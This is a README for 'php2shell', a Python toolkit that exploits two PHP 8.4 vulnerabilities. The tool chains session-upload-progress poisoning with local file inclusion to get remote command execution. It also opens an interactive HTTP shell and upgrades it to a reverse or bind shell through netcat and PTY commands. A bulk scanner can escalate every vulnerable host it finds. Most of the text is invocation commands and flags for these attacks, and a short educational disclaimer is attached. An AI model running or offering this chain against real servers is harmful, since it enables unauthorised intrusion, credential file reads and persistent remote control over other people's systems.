<div align="center">

```
      ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░▒▓███████▓▒░ ░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
      ░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓█▓▒░      ░▒▓█▓▒░        
      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░             ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░             ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░        
      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░ 
                                                                                                                            
                                                                                                                      
```

**PHP CVE Research Toolkit**

![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-22c55e?style=for-the-badge)
![CVE](https://img.shields.io/badge/CVE-2026--109618-ef4444?style=for-the-badge&logo=cve&logoColor=white)
![CVE](https://img.shields.io/badge/CVE-2026--109619-ef4444?style=for-the-badge&logo=cve&logoColor=white)
![Author](https://img.shields.io/badge/Author-4nuxd-a855f7?style=for-the-badge&logo=github&logoColor=white)
![Purpose](https://img.shields.io/badge/Purpose-Educational%20PoC-f59e0b?style=for-the-badge)

</div>

---

> [!CAUTION]
> **For educational and security research purposes only.**
> Run exclusively against systems you own or have explicit written authorisation to test.
> The author accepts no liability for misuse.

---

## Overview

`php2shell.py` is a **standalone** Python toolkit for researching two PHP 8.4.x vulnerabilities. It auto-installs `requests` and `urllib3` on first run. No virtual environment or separate `pip install` needed.

| Module | CVE | What it does |
|---|---|---|
| `cve109618` | CVE-2026-109618 | Zend OOM bailout / allocator probe |
| `cve109619` | CVE-2026-109619 | Pre-RINIT session object deserialisation probe |
| `exploit` | CVE-2026-109619 | Session upload progress poisoning + LFI chain |
| `uaf` | Both | Raw-socket multipart parser crash probe |
| `shell` | Post-exploitation | Interactive HTTP shell over the LFI vector |
| `scan` | CVE-2026-109619 | Bulk URL scanner + interactive escalation picker |
| `all` | Both | Full assessment suite + auto shell escalation |

---

## Quick Start

```bash
git clone https://github.com/4nuxd/php2shell
cd php2shell
python3 php2shell.py --help
```

---

## Subcommands

### `cve109618` - Zend OOM Bailout Probe

Probes PHP's memory allocator to distinguish patched from unpatched behaviour.

```bash
python3 php2shell.py cve109618 -t http://localhost:8080
python3 php2shell.py cve109618 -t http://localhost:8080 --mem-limit 64
```

| Result | Meaning |
|---|---|
| `CRASH_BAILOUT` | Unpatched: longjmp path, connection reset |
| `HARD_LIMIT_HIT` | Patched: FPM worker killed via `_exit(137)` |
| `CATCHABLE_OOM` | Patched: fallible allocator returned NULL |

| Flag | Default | Description |
|---|---|---|
| `-t, --target` | required | Base URL |
| `--mem-limit` | `128` | PHP `memory_limit` in MB |
| `-v, --verbose` | off | Verbose probe logging |

---

### `cve109619` - Pre-RINIT Deserialisation Probe

Three-stage test: inject serialised object into session, trigger RFC1867 callback, read sentinel.

```bash
python3 php2shell.py cve109619 -t http://localhost:8080
python3 php2shell.py cve109619 -t http://localhost:8080 -c "id"
```

| Flag | Default | Description |
|---|---|---|
| `-t, --target` | required | Base URL |
| `-c, --shell-cmd` | `id` | Command to run via `__wakeup()` |
| `-v, --verbose` | off | Show per-stage detail |

---

### `exploit` - Session Upload Poisoning + LFI

Full RCE chain: poison session file via `PHP_SESSION_UPLOAD_PROGRESS`, then LFI include it.

```bash
python3 php2shell.py exploit -t http://localhost:8080
python3 php2shell.py exploit -t http://localhost:8080 -c "cat /etc/passwd"
python3 php2shell.py exploit -t http://localhost:8080 --check
```

| Flag | Default | Description |
|---|---|---|
| `-t, --target` | required | Base URL |
| `-c, --shell-cmd` | `id` | Shell command to run |
| `--check` | off | Recon only, no RCE attempt |
| `--session-path` | `/var/lib/php/sessions` | Remote session directory |
| `--upload-ep` | `/upload.php` | Multipart upload endpoint |
| `--lfi-ep` | `/view.php` | LFI include endpoint |
| `--lfi-param` | `file` | LFI GET parameter name |

**Target requirements**

```
session.upload_progress.enabled = On
session.upload_progress.cleanup = Off
session directory writable by www-data
view.php with LFI reachable
```

---

### `uaf` - Multipart Parser Crash Probe

Sends malformed multipart bodies via raw sockets and classifies crash signals.

```bash
python3 php2shell.py uaf -t http://localhost:8080/upload.php
python3 php2shell.py uaf -t http://localhost:8080/upload.php --repeat 3
python3 php2shell.py uaf -t http://localhost:8080/upload.php --variant nested nullbyte
python3 php2shell.py uaf -t http://localhost:8080/upload.php --json
```

**Variants**

| Variant | Description |
|---|---|
| `nested` | Nested boundaries with double-close |
| `longheader` | Oversized `Content-Disposition` / `Content-Type` |
| `nullbyte` | Null bytes in part body (C string corruption) |
| `truncated` | Missing closing boundary / unexpected EOF |
| `interleaved` | Interleaved boundaries from two containers |

**Verdicts**

| Verdict | Signal |
|---|---|
| `CRASH_LIKELY` | Connection reset / broken pipe |
| `WORKER_DEAD` | HTTP 502/503, FPM worker killed |
| `HANG_OR_CRASH` | Socket timeout |
| `OK` | Normal 200 response |

| Flag | Default | Description |
|---|---|---|
| `-t, --target` | required | Full URL including path |
| `--variant` | all | Space-separated list of variants to run |
| `--repeat` | `1` | Repeat count per variant |
| `--timeout` | `5.0` | Socket timeout in seconds |
| `--json` | off | Output raw JSON results |

---

### `shell` - Interactive HTTP Shell

Persistent shell loop over the session-poisoning + LFI vector. Type `upgrade` to escalate to a real PTY.

```bash
python3 php2shell.py shell -t http://localhost:8080
python3 php2shell.py shell -t http://localhost:8080 --auto-escalate
```

**Shell type comparison**

| Type | Stable | PTY | Interactive | Use when |
|---|---|---|---|---|
| HTTP polling (default) | Partial | No | Limited | Quick recon / file ops |
| Reverse shell (via `upgrade`) | Yes | Yes | Full | Inbound port open on your machine |
| Bind shell (via `upgrade`) | Yes | Partial | Full | Target has open port / you are behind NAT |

**Built-in commands**

| Command | Description |
|---|---|
| `help` | Show command reference |
| `upgrade` | Escalate to stable PTY (reverse or bind shell) |
| `upload <local> <remote>` | Upload a local file to target via `file_put_contents` |
| `download <remote> <local>` | Download remote file via base64 |
| `cd <dir>` | Change directory (tracked server-side across requests) |
| `back` | Return to target picker (bulk scan mode) |
| `switch <url>` | Jump to a different target's shell |
| `clear` | Clear terminal screen |
| `exit / quit / q` | Close shell |

| Flag | Default | Description |
|---|---|---|
| `-t, --target` | required | Base URL |
| `--auto-escalate` | off | Run exploit check first, then open shell |
| `--session-path` | `/var/lib/php/sessions` | Remote session directory |
| `--upload-ep` | `/upload.php` | Upload endpoint |
| `--lfi-ep` | `/view.php` | LFI endpoint |
| `--lfi-param` | `file` | LFI parameter |

**`upgrade` flow**

```
[php2shell@host:/var/www]$ upgrade

  [1]  Reverse Shell   target connects to you
  [2]  Bind Shell      we connect to target
  [q]  Cancel

  Select method: 1
  Your IP (LHOST): 10.10.14.5
  Your port (LPORT): 4444

  Run this BEFORE injecting:
    nc -lvnp 4444

  Press ENTER when your listener is ready ...
  Trying: python3 -> bash -> perl -> nc-mkfifo
```

**PTY upgrade steps (run inside your netcat session)**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z to background nc
stty raw -echo; fg
export TERM=xterm-256color
stty rows 40 cols 200
```

---

### `scan` - Bulk URL Scanner

Concurrent scan of multiple targets. Prints a colour-coded table, then lets you choose which vulnerable target to escalate into a shell.

```bash
python3 php2shell.py scan --url-file targets.txt
python3 php2shell.py scan --urls "http://10.0.0.1,http://10.0.0.2,http://10.0.0.3"
python3 php2shell.py scan --url-file targets.txt --auto-escalate
python3 php2shell.py scan --url-file targets.txt --workers 20
```

**targets.txt format**

```
http://192.168.1.10
http://192.168.1.11
# this line is skipped
http://10.0.0.5
```

**Interactive picker (shown after scan)**

```
  [1]  http://192.168.1.10   PHP 8.4.26
  [2]  http://192.168.1.11   PHP 8.4.25
  [3]  http://10.0.0.5       PHP 8.4.20
  [a]  Escalate ALL in sequence
  [q]  Quit
```

**Navigation inside shell (bulk scan mode)**

```
[php2shell@192.168.1.10:/var/www]$ back
[php2shell@192.168.1.10:/var/www]$ switch http://192.168.1.11
```

| Flag | Default | Description |
|---|---|---|
| `--urls` | none | Comma-separated base URLs |
| `--url-file` | none | File with one URL per line |
| `--workers` | `10` | Concurrent scan threads |
| `--auto-escalate` | off | Skip confirmation, go straight to picker |
| `--session-path` | `/var/lib/php/sessions` | Remote session directory |
| `--upload-ep` | `/upload.php` | Upload endpoint |
| `--lfi-ep` | `/view.php` | LFI endpoint |
| `--lfi-param` | `file` | LFI parameter |

---

### `all` - Full Assessment

Runs every module in sequence, prints a summary dashboard, and auto-drops into an interactive shell if RCE is confirmed.

```bash
python3 php2shell.py all -t http://localhost:8080
python3 php2shell.py all -t http://localhost:8080 -c "id" --mem-limit 64
```

---

## CVE Details

### CVE-2026-109618 - Zend OOM Bailout

PHP before 8.4.27 used `emalloc()` (assert-on-failure) for all internal allocations. When a request hit `memory_limit`, `zend_bailout()` called `longjmp()` to unwind the stack, which could race through partially-initialised allocator structures causing memory corruption.

**Fix in 8.4.27:** Fallible allocator path introduced. Allocations can return `NULL` and PHP raises a catchable `E_ERROR` instead of using `longjmp`.

---

### CVE-2026-109619 - Pre-RINIT Session Deserialisation

PHP's RFC1867 upload-progress handler (`rfc1867_callback`) reads and deserialises the session file inside the multipart parser, which fires **before `php_request_startup()` (RINIT)**. The `PS()` session globals are uninitialised at this point, so any `__wakeup()` or `__destruct()` on a deserialised object runs against stale/zero memory.

**Fix in 8.4.27:** `PS(in_rfc1867_update) = true` is set before the session read. The deserialiser is called with `INCOMPLETE_CLASSES_ONLY`, preventing magic method invocation.

---

## Docker Test Environment

```bash
docker run -d --name php-lab \
  -p 8080:80 \
  php:8.4.26-apache

docker exec php-lab bash -c "
  echo 'session.upload_progress.enabled=1' >> /usr/local/etc/php/php.ini
  echo 'session.upload_progress.cleanup=0'  >> /usr/local/etc/php/php.ini
  chmod 777 /var/lib/php/sessions
"

docker cp session_inject.php  php-lab:/var/www/html/
docker cp check_sentinel.php  php-lab:/var/www/html/
docker cp upload.php          php-lab:/var/www/html/
docker cp view.php            php-lab:/var/www/html/
docker cp debug.php           php-lab:/var/www/html/
docker cp oom_trigger.php     php-lab:/var/www/html/
```

---

## Requirements

![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=flat-square&logo=python&logoColor=white)
![requests](https://img.shields.io/badge/requests-2.28%2B-2563eb?style=flat-square)
![urllib3](https://img.shields.io/badge/urllib3-1.26%2B-7c3aed?style=flat-square)

Both `requests` and `urllib3` are auto-installed on first run. No manual setup required.

---

## File Structure

```
php2shell/
├── php2shell.py          standalone unified toolkit
├── cve_109618.py         original OOM probe
├── cve_109619.py         original pre-RINIT probe
├── exploit.py            original LFI chain
├── uaf_probe.py          original UAF probe
└── requirements.txt      pip deps (only needed for the original scripts)
```

---

## Author

[![GitHub](https://img.shields.io/badge/GitHub-4nuxd-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/4nuxd)

---

## Disclaimer

![Educational](https://img.shields.io/badge/Purpose-Educational%20PoC%20Only-f59e0b?style=flat-square)
![No Liability](https://img.shields.io/badge/Liability-None-ef4444?style=flat-square)
![PHP](https://img.shields.io/badge/Affects-PHP%20%3C%208.4.27-7941a5?style=flat-square&logo=php&logoColor=white)

This project is released for **security research and educational purposes only**.

- Do **not** use against systems you do not own or lack explicit written permission to test.
- All techniques are public knowledge documented in the official PHP security advisory and PHP issue tracker (issue #24492).
- The author assumes **no responsibility** for any misuse or damage caused.
